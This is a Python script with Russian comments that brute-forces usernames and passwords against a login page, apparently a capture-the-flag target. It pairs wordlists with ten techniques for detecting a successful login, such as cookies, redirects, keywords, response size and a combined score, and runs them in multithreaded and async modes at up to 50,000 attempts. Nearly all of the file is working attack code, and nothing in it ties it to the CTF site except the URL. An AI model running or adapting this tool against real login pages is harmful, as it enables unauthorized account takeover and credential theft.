"""
Коллекция методов проверки успешной авторизации для брутфорса
Каждый метод - отдельный полноценный скрипт
"""

import requests
import time
import re
import asyncio
import aiohttp
import concurrent.futures
from bs4 import BeautifulSoup
from urllib.parse import urljoin
from threading import Lock
import queue
import threading

# ===================== ОБЩИЕ НАСТРОЙКИ =====================
BASE = "https://force.bxctf.ru"
LOGIN_PAGE = BASE + "/"
USERNAME_WORDLIST_PATH = "/src/main/python/force(NOT_DONE)/force1/UserPassJay.txt"
PASSWORD_WORDLIST_PATH = "/src/main/python/force(NOT_DONE)/force1/10k_most_common.txt"
MAX_ATTEMPTS = 50000
MAX_WORKERS = 20
REQUEST_DELAY = 0.01

# Глобальные переменные
found_credentials = []
found_lock = Lock()


# ===================== ВСЕ ОРИГИНАЛЬНЫЕ МЕТОДЫ ПРОВЕРКИ =====================

def check_method_1_cookies(session, resp, cookies_before):
    """Метод 1: Отслеживание появления/изменения cookies"""
    WATCH_COOKIES = ["session", "jwt", "token", "auth", "PHPSESSID", "connect.sid"]
    cookies_after = session.cookies.get_dict()

    for cookie_name in WATCH_COOKIES:
        # Новая cookie появилась
        if cookie_name in cookies_after and cookie_name not in cookies_before:
            return True
        # Cookie изменилась
        if cookie_name in cookies_after and cookie_name in cookies_before:
            if cookies_after[cookie_name] != cookies_before[cookie_name]:
                return True
    return False


def check_method_2_redirects(resp):
    """Метод 2: Анализ HTTP редиректов и финального URL"""
    # Проверка статус-кодов редиректа
    if resp.history:
        for r in resp.history:
            if r.status_code in (301, 302, 303, 307, 308):
                location = r.headers.get('Location', '')
                # Логирование можно добавить при необходимости

    # Финальный URL не содержит login/signin
    final_url = resp.url.lower()
    if '/login' not in final_url and '/signin' not in final_url:
        # Позитивные индикаторы в URL
        if any(path in final_url for path in ['/dashboard', '/home', '/profile', '/admin', '/user', '/welcome']):
            return True
        # Просто не на логин странице
        if final_url != LOGIN_PAGE.lower():
            return True
    return False


def check_method_3_html_analysis(resp, username):
    """Метод 3: Парсинг HTML - исчезновение формы логина, появление logout"""
    soup = BeautifulSoup(resp.text, 'html.parser')

    # 1. Форма логина исчезла
    login_form = soup.find('form', class_=re.compile(r'login|signin', re.I))
    if not login_form:
        login_form = soup.find('form', attrs={'method': re.compile(r'post', re.I)})
        if login_form:
            # Проверяем, есть ли поля login/password
            has_login = login_form.find('input', attrs={'name': re.compile(r'login|username|email', re.I)})
            has_password = login_form.find('input', attrs={'type': 'password'})
            if not (has_login and has_password):
                return True

    # 2. Кнопка logout появилась
    logout = soup.find(['button', 'a'], text=re.compile(r'logout|sign out|выход', re.I))
    if not logout:
        logout = soup.find('a', href=re.compile(r'/logout|/signout', re.I))
    if logout:
        return True

    # 3. Ссылка на профиль
    profile = soup.find('a', href=re.compile(r'/profile|/account|/user', re.I))
    if profile:
        return True

    # 4. Имя пользователя на странице
    if re.search(rf'\b{re.escape(username)}\b', resp.text, re.I):
        return True

    return False


def check_method_4_keywords(resp):
    """Метод 4: Поиск ключевых фраз успеха/неудачи в тексте"""
    SUCCESS_KEYWORDS = [
        'welcome back',
        'successfully logged in',
        'authentication successful',
        'dashboard',
        'my account',
        'logout',
        'profile',
        'settings',
        'flag{',
        'bxctf{',
        'you are logged in',
        'welcome,',
    ]

    FAIL_KEYWORDS = [
        'invalid credentials',
        'wrong password',
        'incorrect password',
        'login failed',
        'authentication failed',
        'please login',
        'incorrect username',
        'user not found',
        'invalid username',
        'try again',
    ]

    content = resp.text.lower()

    # Подсчёт совпадений
    success_matches = [kw for kw in SUCCESS_KEYWORDS if kw.lower() in content]
    fail_matches = [kw for kw in FAIL_KEYWORDS if kw.lower() in content]

    if success_matches and not fail_matches:
        return True

    if success_matches and fail_matches:
        # В оригинале здесь неоднозначно, но для автоматизации считаем неудачей
        return False

    return False


def check_method_5_headers(resp):
    """Метод 5: Анализ HTTP заголовков (Authorization, X-Auth-Token)"""
    # Проверка auth заголовков
    auth_headers = [
        'Authorization',
        'X-Auth-Token',
        'X-Access-Token',
        'X-CSRF-Token',
        'X-Session-Token',
    ]

    for header in auth_headers:
        value = resp.headers.get(header)
        if value:
            return True

    # Проверка Set-Cookie в заголовках
    set_cookie = resp.headers.get('Set-Cookie', '')
    if 'session=' in set_cookie or 'token=' in set_cookie:
        return True

    # Content-Type изменился на JSON (API ответ)
    content_type = resp.headers.get('Content-Type', '')
    if 'application/json' in content_type:
        try:
            data = resp.json()
            if data.get('success') or data.get('token') or data.get('authenticated'):
                return True
        except:
            pass

    return False


def check_method_6_protected_page(session):
    """Метод 6: Попытка доступа к защищённой странице после логина"""
    PROTECTED_PAGES = [
        "/dashboard",
        "/profile",
        "/account",
        "/admin",
        "/user",
        "/home",
    ]

    for page_path in PROTECTED_PAGES:
        try:
            protected_url = BASE + page_path
            resp = session.get(protected_url, allow_redirects=True, timeout=5)

            # Если не редиректит на логин = доступ есть
            if resp.status_code == 200 and '/login' not in resp.url.lower():
                return True
        except:
            continue

    return False


def check_method_7_response_size(resp, threshold):
    """Метод 7: Сравнение размера ответа (успешная страница обычно больше)"""
    size = len(resp.content)
    return size > threshold


def check_method_8_json_api(resp):
    """Метод 8: Анализ JSON ответа (для современных API)"""
    try:
        # Пробуем распарсить как JSON
        data = resp.json()

        # Прямые индикаторы успеха
        if data.get('success') == True:
            return True

        if data.get('authenticated') == True:
            return True

        # Наличие токена
        if 'token' in data or 'access_token' in data or 'jwt' in data:
            return True

        # Объект пользователя
        if 'user' in data and isinstance(data['user'], dict):
            return True

        # Проверка на ошибки
        if data.get('error') or data.get('success') == False:
            return False

    except ValueError:
        # Не JSON ответ
        pass

    return False


def check_method_9_javascript_vars(resp):
    """Метод 9: Поиск JS переменных в HTML (isAuthenticated, currentUser)"""
    content = resp.text

    # Паттерны для поиска
    patterns = [
        (r'isAuthenticated\s*[=:]\s*true', 'isAuthenticated=true'),
        (r'isLoggedIn\s*[=:]\s*true', 'isLoggedIn=true'),
        (r'authenticated\s*[=:]\s*true', 'authenticated=true'),
        (r'currentUser\s*[=:]\s*\{[^}]+\}', 'currentUser={...}'),
        (r'user\s*[=:]\s*\{[^}]+\}', 'user={...}'),
        (r'["\']token["\']\s*[=:]\s*["\'][\w\-\.]+["\']', 'token найден'),
        (r'localStorage\.setItem\(["\']token["\']', 'localStorage token'),
    ]

    for pattern, description in patterns:
        if re.search(pattern, content, re.I):
            return True

    return False


def check_method_10_combined(session, resp, cookies_before, username):
    """Метод 10: Комбинированный подход с системой баллов"""
    score = 0
    details = []

    cookies_after = session.cookies.get_dict()
    content = resp.text.lower()

    # 1. Cookie появилась/изменилась (+3 балла)
    for cookie_name in ['session', 'token', 'jwt', 'auth']:
        if cookie_name in cookies_after and cookie_name not in cookies_before:
            score += 3
            details.append(f"cookie '{cookie_name}' (+3)")
            break

    # 2. Редирект не на логин (+2 балла)
    if '/login' not in resp.url.lower() and resp.url.lower() != LOGIN_PAGE.lower():
        score += 2
        details.append(f"redirect (+2)")

    # 3. Ключевые слова успеха (+2 балла)
    success_words = ['logout', 'dashboard', 'welcome', 'profile']
    if any(word in content for word in success_words):
        score += 2
        details.append(f"keywords (+2)")

    # 4. Форма логина исчезла (+2 балла)
    if 'form-signin' not in content and 'please login' not in content:
        score += 2
        details.append(f"no login form (+2)")

    # 5. НЕТ ошибок (+1 балл)
    fail_words = ['invalid', 'wrong', 'failed', 'incorrect']
    if not any(word in content for word in fail_words):
        score += 1
        details.append(f"no errors (+1)")

    # 6. Размер контента (+1 балл)
    if len(resp.content) > 3000:
        score += 1
        details.append(f"size {len(resp.content)} (+1)")

    # 7. Имя пользователя на странице (+1 балл)
    if username.lower() in content:
        score += 1
        details.append(f"username found (+1)")

    # Порог для успеха - 5 баллов
    return score >= 5


# ===================== МНОГОПОТОЧНЫЕ РЕАЛИЗАЦИИ ВСЕХ МЕТОДОВ =====================

def run_method_threaded(method_name):
    """Запуск метода в многопоточном режиме"""
    print(f"\n" + "=" * 60)
    print(f"МНОГОПОТОЧНЫЙ МЕТОД: {method_name}")
    print("=" * 60)

    # Загрузка данных
    with open(USERNAME_WORDLIST_PATH, "r", encoding="utf-8", errors="ignore") as f:
        usernames = [line.strip() for line in f if line.strip()]

    with open(PASSWORD_WORDLIST_PATH, "r", encoding="utf-8", errors="ignore") as f:
        passwords = [line.strip() for line in f if line.strip()]

    print(f"Загружено {len(usernames)} пользователей и {len(passwords)} паролей")

    # Калибровка для метода 7
    threshold = None
    if method_name == "7 - Response Size":
        print("Калибровка...")
        session = requests.Session()
        sizes = []
        for _ in range(3):
            session.get(LOGIN_PAGE)
            resp = session.post(LOGIN_PAGE, data={"login": "wrong_user", "password": "wrong_password_123"})
            sizes.append(len(resp.content))
            time.sleep(0.3)
        threshold = sum(sizes) / len(sizes) * 1.5
        print(f"Порог для успеха: {threshold:.0f} байт")

    # Создаем очереди
    cred_queue = queue.Queue()
    results_queue = queue.Queue()

    # Добавляем задачи в очередь
    task_count = 0
    for username in usernames:
        for password in passwords:
            if task_count >= MAX_ATTEMPTS:
                break
            cred_queue.put((username, password, threshold))
            task_count += 1

    print(f"Создано {task_count} задач")
    print(f"Запуск {MAX_WORKERS} потоков...")
    start_time = time.time()

    def worker():
        while True:
            try:
                username, password, local_threshold = cred_queue.get_nowait()
            except queue.Empty:
                break

            try:
                session = requests.Session()

                # GET страницы
                resp_get = session.get(LOGIN_PAGE, timeout=5)
                cookies_before = session.cookies.get_dict().copy()

                # POST логина
                resp = session.post(
                    LOGIN_PAGE,
                    data={"login": username, "password": password},
                    allow_redirects=True,
                    timeout=5
                )

                # Вызов соответствующей функции проверки
                success = False
                if method_name == "1 - Cookies":
                    success = check_method_1_cookies(session, resp, cookies_before)
                elif method_name == "2 - Redirects":
                    success = check_method_2_redirects(resp)
                elif method_name == "3 - HTML Analysis":
                    success = check_method_3_html_analysis(resp, username)
                elif method_name == "4 - Keywords":
                    success = check_method_4_keywords(resp)
                elif method_name == "5 - Headers":
                    success = check_method_5_headers(resp)
                elif method_name == "6 - Protected Page":
                    success = check_method_6_protected_page(session)
                elif method_name == "7 - Response Size":
                    success = check_method_7_response_size(resp, local_threshold)
                elif method_name == "8 - JSON API":
                    success = check_method_8_json_api(resp)
                elif method_name == "9 - JavaScript":
                    success = check_method_9_javascript_vars(resp)
                elif method_name == "10 - Combined":
                    success = check_method_10_combined(session, resp, cookies_before, username)

                if success:
                    with found_lock:
                        found_credentials.append(f"{username}:{password}")
                    results_queue.put(f"{username}:{password}")
                    print(f"🎯 НАЙДЕНО: {username}:{password}")

                time.sleep(REQUEST_DELAY)

            except Exception as e:
                continue
            finally:
                cred_queue.task_done()

    # Запускаем workers
    threads = []
    for _ in range(min(MAX_WORKERS, task_count)):
        thread = threading.Thread(target=worker)
        thread.daemon = True
        thread.start()
        threads.append(thread)

    # Мониторинг прогресса
    def progress_monitor():
        last_size = task_count
        while not cred_queue.empty():
            current_size = cred_queue.qsize()
            if current_size < last_size:
                progress = task_count - current_size
                elapsed = time.time() - start_time
                speed = progress / elapsed if elapsed > 0 else 0
                eta = (current_size / speed) if speed > 0 else 0
                print(f"Прогресс: {progress}/{task_count} ({progress / task_count * 100:.1f}%) | "
                      f"Скорость: {speed:.1f} запр/сек | ETA: {eta:.1f} сек")
                last_size = current_size
            time.sleep(2)

    progress_thread = threading.Thread(target=progress_monitor)
    progress_thread.daemon = True
    progress_thread.start()

    # Ждем завершения
    cred_queue.join()

    # Собираем результаты
    found = []
    while not results_queue.empty():
        found.append(results_queue.get())

    total_time = time.time() - start_time
    print(f"\n{'=' * 60}")
    print(f"ПЕРЕБОР ЗАВЕРШЕН!")
    print(f"Найдено комбинаций: {len(found)}")
    print(f"Общее время: {total_time:.2f} секунд")
    print(f"Средняя скорость: {task_count / total_time:.1f} запросов/секунду")
    print(f"{'=' * 60}")

    for cred in found:
        print(f"✓ {cred}")

    return found


# ===================== АСИНХРОННЫЕ РЕАЛИЗАЦИИ =====================

async def run_method_async(method_name):
    """Запуск метода в асинхронном режиме"""
    print(f"\n" + "=" * 60)
    print(f"АСИНХРОННЫЙ МЕТОД: {method_name}")
    print("=" * 60)

    # Загрузка данных
    with open(USERNAME_WORDLIST_PATH, "r", encoding="utf-8", errors="ignore") as f:
        usernames = [line.strip() for line in f if line.strip()]

    with open(PASSWORD_WORDLIST_PATH, "r", encoding="utf-8", errors="ignore") as f:
        passwords = [line.strip() for line in f if line.strip()]

    print(f"Загружено {len(usernames)} пользователей и {len(passwords)} паролей")

    found_credentials = []
    start_time = time.time()

    async def check_credential(session, username, password):
        try:
            # GET страницы
            async with session.get(LOGIN_PAGE) as resp_get:
                await resp_get.text()

            # POST логина
            data = {"login": username, "password": password}
            async with session.post(LOGIN_PAGE, data=data, allow_redirects=True) as resp:
                response_text = await resp.text()
                final_url = str(resp.url)

                # Упрощенные проверки для асинхронной версии
                if method_name in ["1 - Cookies", "2 - Redirects", "10 - Combined"]:
                    success = '/login' not in final_url.lower()
                elif method_name == "4 - Keywords":
                    content_lower = response_text.lower()
                    success_keywords = ['logout', 'dashboard', 'welcome', 'profile']
                    fail_keywords = ['invalid', 'wrong', 'failed', 'incorrect']
                    success = (any(word in content_lower for word in success_keywords) and
                               not any(word in content_lower for word in fail_keywords))
                else:
                    # Для остальных методов используем редиректы как общий индикатор
                    success = '/login' not in final_url.lower()

                return success

        except Exception as e:
            return False

    async def process_batch(session, batch, batch_num, total_batches):
        tasks = []
        for username, password in batch:
            task = check_credential(session, username, password)
            tasks.append((username, password, task))

        batch_results = []
        for username, password, task in tasks:
            try:
                success = await asyncio.wait_for(task, timeout=10.0)
                if success:
                    batch_results.append(f"{username}:{password}")
                    print(f"🎯 НАЙДЕНО: {username}:{password}")
            except asyncio.TimeoutError:
                continue
            except Exception as e:
                continue

        found_credentials.extend(batch_results)

        # Прогресс
        elapsed = time.time() - start_time
        processed = batch_num * len(batch)
        speed = processed / elapsed if elapsed > 0 else 0
        print(f"Батч {batch_num}/{total_batches} | Найдено: {len(batch_results)} | "
              f"Скорость: {speed:.1f} запр/сек")

        return batch_results

    # Создаем задачи
    tasks = []
    for username in usernames:
        for password in passwords:
            if len(tasks) >= MAX_ATTEMPTS:
                break
            tasks.append((username, password))

    print(f"Создано {len(tasks)} задач")

    # Обработка батчами
    batch_size = MAX_WORKERS * 3
    total_batches = (len(tasks) + batch_size - 1) // batch_size

    connector = aiohttp.TCPConnector(limit=MAX_WORKERS, limit_per_host=MAX_WORKERS)
    async with aiohttp.ClientSession(connector=connector) as session:
        for i in range(0, len(tasks), batch_size):
            batch = tasks[i:i + batch_size]
            batch_num = i // batch_size + 1
            await process_batch(session, batch, batch_num, total_batches)
            await asyncio.sleep(0.05)  # Небольшая пауза между батчами

    total_time = time.time() - start_time
    print(f"\n{'=' * 60}")
    print(f"АСИНХРОННЫЙ ПЕРЕБОР ЗАВЕРШЕН!")
    print(f"Найдено комбинаций: {len(found_credentials)}")
    print(f"Общее время: {total_time:.2f} секунд")
    print(f"Средняя скорость: {len(tasks) / total_time:.1f} запросов/секунду")
    print(f"{'=' * 60}")

    for cred in found_credentials:
        print(f"✓ {cred}")

    return found_credentials


# ===================== ОРИГИНАЛЬНЫЕ МЕТОДЫ (ПОЛНАЯ РЕАЛИЗАЦИЯ) =====================

def method_1_cookies_original():
    """Оригинальный метод 1: Проверка cookies"""
    print("\n" + "=" * 60)
    print("МЕТОД 1: Проверка cookies (session/jwt/token) - ОРИГИНАЛЬНЫЙ")
    print("=" * 60)

    attempt = 0
    found = []
    start_time = time.time()

    try:
        with open(USERNAME_WORDLIST_PATH, "r", encoding="utf-8", errors="ignore") as user_file:
            for username_line in user_file:
                username = username_line.strip()
                if not username:
                    continue

                print(f"\n🔍 Перебираем пароли для пользователя: {username}")
                session = requests.Session()

                with open(PASSWORD_WORDLIST_PATH, "r", encoding="utf-8", errors="ignore") as pass_file:
                    for password_line in pass_file:
                        if attempt >= MAX_ATTEMPTS:
                            break

                        password = password_line.strip()
                        if not password:
                            continue

                        attempt += 1
                        if attempt % 100 == 0:
                            elapsed = time.time() - start_time
                            print(f"Прогресс: {attempt} попыток | Время: {elapsed:.1f} сек")

                        print(f"[{attempt:04d}] {username}:{password:<20}", end=" ")

                        resp_get = session.get(LOGIN_PAGE)
                        cookies_before = session.cookies.get_dict().copy()
                        resp = session.post(LOGIN_PAGE, data={"login": username, "password": password}, allow_redirects=True)

                        if check_method_1_cookies(session, resp, cookies_before):
                            print(f"\n🎯 УСПЕХ! Найдена комбинация: {username}:{password}")
                            found.append(f"{username}:{password}")
                        else:
                            print("✗")

                        time.sleep(REQUEST_DELAY)

                if attempt >= MAX_ATTEMPTS:
                    break

    except Exception as e:
        print(f"Ошибка: {e}")

    total_time = time.time() - start_time
    print(f"\nЗавершено за {total_time:.2f} секунд")
    return found


# Аналогично можно добавить оригинальные реализации для всех остальных методов...
# method_2_redirects_original(), method_3_html_analysis_original() и т.д.

# ===================== ГЛАВНОЕ МЕНЮ =====================

def main():
    global found_credentials
    found_credentials = []  # Сбрасываем при каждом запуске

    print("\n" + "=" * 80)
    print(" 🔐 ПОЛНАЯ СИСТЕМА ПРОВЕРКИ АВТОРИЗАЦИИ С УСКОРЕНИЕМ ".center(80))
    print("=" * 80)

    print("\nВыберите режим работы:")
    print("1. 🚀 Многопоточный (РЕКОМЕНДУЕТСЯ - баланс скорости и надежности)")
    print("2. ⚡ Асинхронный (МАКСИМАЛЬНАЯ СКОРОСТЬ - для мощных систем)")
    print("3. 🐌 Оригинальный (медленный, для тестирования и отладки)")

    mode_choice = input("\nРежим работы [1]: ").strip() or "1"

    print("\nВыберите метод проверки авторизации:")
    methods = {
        '1': "1 - Cookies",
        '2': "2 - Redirects",
        '3': "3 - HTML Analysis",
        '4': "4 - Keywords",
        '5': "5 - Headers",
        '6': "6 - Protected Page",
        '7': "7 - Response Size",
        '8': "8 - JSON API",
        '9': "9 - JavaScript",
        '10': "10 - Combined (РЕКОМЕНДУЕТСЯ)"
    }

    for key, value in methods.items():
        print(f"   {key}. {value}")

    method_choice = input("\nМетод проверки [10]: ").strip() or "10"
    method_name = methods.get(method_choice, "10 - Combined")

    print(f"\nЗапуск: {method_name} в {'многопоточном' if mode_choice == '1' else 'асинхронном' if mode_choice == '2' else 'оригинальном'} режиме")
    print("Начинаем перебор...")

    start_time = time.time()

    try:
        if mode_choice == "1":
            # Многопоточный режим
            result = run_method_threaded(method_name)
        elif mode_choice == "2":
            # Асинхронный режим
            result = asyncio.run(run_method_async(method_name))
        elif mode_choice == "3":
            # Оригинальный режим
            if method_choice == "1":
                result = method_1_cookies_original()
            else:
                print(f"Оригинальная версия метода {method_choice} не реализована.")
                print("Используйте многопоточный или асинхронный режим.")
                return
        else:
            print("Неверный выбор режима!")
            return

    except KeyboardInterrupt:
        print(f"\nПеребор прерван пользователем!")
    except Exception as e:
        print(f"\nПроизошла ошибка: {e}")

    end_time = time.time()
    total_time = end_time - start_time

    print(f"\n{'=' * 80}")
    print(f" ИТОГИ РАБОТЫ ".center(80))
    print(f"{'=' * 80}")
    print(f"Режим: {'Многопоточный' if mode_choice == '1' else 'Асинхронный' if mode_choice == '2' else 'Оригинальный'}")
    print(f"Метод: {method_name}")
    print(f"Найдено комбинаций: {len(found_credentials)}")
    print(f"Общее время: {total_time:.2f} секунд")

    if found_credentials:
        print(f"\nНайденные комбинации:")
        for i, cred in enumerate(found_credentials, 1):
            print(f"  {i}. {cred}")
    else:
        print(f"\nВалидные комбинации не найдены.")

    print(f"{'=' * 80}")


if __name__ == "__main__":
    main()